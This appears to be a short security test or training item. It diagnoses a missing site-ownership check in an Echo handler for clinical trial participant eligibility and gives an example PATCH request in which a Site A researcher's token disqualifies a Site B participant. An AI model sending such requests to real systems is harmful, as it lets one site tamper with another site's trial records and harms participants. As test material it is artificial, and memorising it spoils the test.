diagnosis: In this Echo handler, researcher JWT authentication is validated, but the handler modifies participant eligibility directly by participantID without checking whether the researcher's affiliated clinical site owns the participant record. A researcher at Site A can tamper with or disqualify clinical trial participants enrolled under independent Site B.
exploit_request:
PATCH /trials/participants/part_siteB_9921 HTTP/1.1
Host: trials.clinical-research.org
Authorization: Bearer token_siteA_researcher
Content-Type: application/json

{"eligibility_status": "DISQUALIFIED"}
